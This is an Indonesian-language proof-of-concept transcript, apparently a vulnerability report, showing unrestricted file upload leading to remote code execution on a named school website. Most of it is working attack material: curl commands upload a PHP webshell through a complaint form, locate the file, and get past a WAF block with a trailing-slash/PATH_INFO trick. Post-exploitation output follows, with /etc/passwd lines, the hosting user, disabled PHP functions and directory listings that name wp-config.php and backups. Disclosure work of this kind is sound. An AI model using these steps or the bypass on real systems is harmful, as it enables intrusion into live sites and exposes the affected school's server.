@@ -1,0 +1,103 @@
+# Report-2 / F1 — Unrestricted File Upload → Unauthenticated RCE
+# Transkrip PoC (PII/db-credential di-redact). Artefak uji sudah dihapus dari server.
+
+TARGET=https://smpm12gkb.sch.id
+ENDPOINT=$TARGET/app/page/E-Complaint/api.php
+
+================================================================
+[A] BUKTI DIREKTORI UPLOAD DAPAT DIAKSES WEB
+================================================================
+$ # upload file .txt biasa
+$ curl -s -X POST "$ENDPOINT" \
+    -F "action=submit_complaint" -F "nama=D" -F "telp=+6289999" \
+    -F "email=d@e.com" -F "jenis=Masyarakat Umum" -F "lingkup=Sarana Prasarana" \
+    -F "keluhan=dirprobe" -F "terms=on" \
+    -F "pendukung=@probe.txt;filename=probe.txt;type=text/plain"
+{"status":"success","ticket_id":"EC-44450616102026","aisa_status":{...}}
+
+$ curl -s "$ENDPOINT?action=get_status&ticket_id=EC-44450616102026"
+... "pendukung":"complaint_EC-44450616102026_1792133144.txt" ...
+
+$ curl -s -i "$TARGET/app/page/files/complaint_EC-44450616102026_1792133144.txt"
+HTTP/2 200
+FOUND_DIR_TXT_12345          <-- isi utuh, direktori WEB-ACCESSIBLE
+
+================================================================
+[B] FILE .php DITERIMA, EKSTENSI DIPERTAHANKAN, DISIMPAN
+================================================================
+$ # upload shell.php dengan konten PHP
+$ curl -s -X POST "$ENDPOINT" \
+    -F "action=submit_complaint" -F "nama=RCEPoC" -F "telp=+628111222333" \
+    -F "email=rce@example.com" -F "jenis=Masyarakat Umum" -F "lingkup=Sarana Prasarana" \
+    -F "keluhan=RCE proof" -F "terms=on" \
+    -F "pendukung=@shell.php;filename=shell.php;type=application/x-php"
+{"status":"success","ticket_id":"EC-43510616102026","aisa_status":{...}}
+
+$ curl -s "$ENDPOINT?action=get_status&ticket_id=EC-43510616102026"
+... "pendukung":"complaint_EC-43510616102026_1792133503.php" ...
+
+================================================================
+[C] WAF EDGE MEMBLOKIR AKSES LANGSUNG .php
+================================================================
+$ curl -s -o /dev/null -w '%{http_code}\n' \
+    "$TARGET/app/page/files/complaint_EC-43510616102026_1792133503.php"
+403                         <-- WAF hcdn (pola URL /app/**.php)
+
+================================================================
+[D] BYPASS: TRAILING SLASH / PATH_INFO  -> EKSEKUSI
+================================================================
+$ curl -s -i "$TARGET/app/page/files/complaint_EC-43510616102026_1792133503.php/"
+HTTP/2 200
+content-type: text/plain;charset=UTF-8
+x-powered-by: PHP/8.3.35
+platform: hostinger
+server: hcdn
+
+RCE_OK
+PHP=8.3.35
+UNAME=Linux id-dci-web1633.main-hosting.eu 5.14.0-611.55.1.el9_7.x86_64 #1 SMP PREEMPT_DYNAMIC Tue May 19 15:19:29 EDT 2026 x86_64
+USER=u576897008
+CWD=/home/u576897008/domains/smpm12gkb.sch.id/public_html/app/page/files
+
+$ # variasi lain yang juga mengeksekusi:
+$ curl -s -o /dev/null -w '%{http_code}\n' "$TARGET/app/page/files/complaint_EC-43510616102026_1792133503.php/"
+200
+$ curl -s -o /dev/null -w '%{http_code}\n' "$TARGET/app/page/files/complaint_EC-43510616102026_1792133503.php/."
+200
+$ curl -s -o /dev/null -w '%{http_code}\n' "$TARGET/app/page/files/complaint_EC-43510616102026_1792133503.php/x"
+200
+
+================================================================
+[E] PASCA-RCE: BACA FILE ARBITRER + ENUMERASI DIREKTORI
+================================================================
+== /etc/passwd (head) ==
+mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
+exim:x:93:93::/var/spool/exim:/sbin/nologin
+apache:x:977:48::/home/apache:/bin/bash
+nobody:x:65534:65534:Kernel Overflow User:/:/sbin/nologin
+mysql:x:984:981:MySQL server:/var/lib/mysql:/bin/bash
+bin:x:1:1:bin:/bin:/sbin/nologin
+
+== disable_functions ==
+system, exec, shell_exec, passthru, mysql_list_dbs, ini_alter, dl, symlink, link,
+chgrp, leak, popen, apache_child_terminate, virtual, mb_send_mail, proc_open
+
+== DOCROOT ROOT listing ==
+.htaccess .htaccess.bk .htaccess.old-1758528411 .litespeed_flag .tmb .well-known.zip
+admin_members_search.php admin_users_export.php admin_users_import.php
+app default.php error_log go guestbook index.php interviewsmp interviewsmp.zip
+kartuujian konsumsi license.txt llms.txt media12 order-publikasi-spemdalas
+paket pemanggilan pemanggilan.zip ppdb public_html pwd readme.html
+slims9_bulian-9.7.2 spmb synology tamanilmu "tamanilmu(backup)" tictactoe
+undanganfinalmoment virtualclass virtualclass_backup visitor_stats.json
+wp-config.php wp-* xmlrpc.php
+
+== /app listing ==        bridge.php guard.php form misc page tools
+== /app/page listing ==   "AISA Chat" Discovery E-Complaint "formulir inden" files
+
+================================================================
+[F] PEMBERSIHAN
+================================================================
+Seluruh file uji di /app/page/files/ (webshell, probe, dsb.) dihapus lewat RCE
+(unlink). Baris tiket uji (nama ExtTest/RCEPoC/ReadPoC/Dump/Cfg/Clean*/dst)
+dihapus via admin_delete. Verifikasi akhir: files/ kosong; sisa baris = tiket asli.
